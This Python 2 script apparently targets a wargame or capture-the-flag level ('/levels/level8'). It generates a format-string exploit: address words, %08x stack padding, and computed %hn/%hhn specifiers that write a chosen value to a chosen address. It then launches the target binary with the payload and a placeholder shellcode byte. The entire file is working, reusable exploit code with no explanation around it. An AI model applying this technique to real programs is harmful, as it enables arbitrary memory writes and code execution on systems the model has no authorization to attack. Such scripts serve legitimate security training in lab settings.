#!/usr/bin/python2

import os
import struct
import math

# enter values here
shellcode   = "\xcc"
style       = 2             # 1-, 2-, or 4-byte writes
stack_at    = 8             # how many words back we are on the stack
address     = 0xdeadbeef    # where to write
value       = struct.pack("<I", 0x41424344) # what to write

def ceil(f):
    return int(math.ceil(f))

def write_to(addr, bytes, style):
    A = ord('A')
    junk = map(chr, range(A, A + bytes))

    addrs = ""
    for i in range(ceil(bytes / float(style))):
        addrs += struct.pack("<I", addr + i * style) + junk[i]*4
    # Don't need the trailing junk
    return addrs[:-4]

# should have options to use other specifiers
def get_stack(position):
    # If our string is at position, we need 2 spots before it
    # to perform our writes properly
    return "%08x" * (position - 2)

def chop(word):
    chopped = []
    for i in range(4):
        chopped.append(word & 0xff)
        word >>= 8
    return chopped

def calc_len(fmt):
    length  = fmt.index('%')        # count the non-interpretable characters
    length += fmt.count('%') * 8    # each one prints out 8 characters
    return length

def write_what(what, fmt, style):
    how =  {1: ("c", "hh"), 2: ("H", "h"), 4: ("I", "")}
    length = calc_len(fmt)

    # How do we unpack and write our data?
    (rep, write) = how[style]
    # How many chunks of the data are there?
    nchunks      = ceil(len(what) / float(style))

    overwrite = ""
    for chunk in struct.unpack("<" + rep * nchunks, what):
        # XXX fix this hack
        if style == 1:
            chunk = ord(chunk)

        how_much = chunk - length
        if length > chunk or how_much < 8:
            how_much += pow(0x100, style)

        # E.g., %42x%hn
        overwrite += "%" + str(how_much) + "x%" + write + "n"

        # We already know how much we've printed and that was our last write
        length = chunk
    return overwrite

exploit  = write_to(address, len(value), style) # prep the address for a write
exploit += get_stack(stack_at)
exploit += write_what(value, exploit, style)    # write our bytes

print exploit

path = "/levels/level8"
args = ["level8", "1", shellcode, exploit]
env = {}

os.chdir("/")
os.execve(path, args, env)
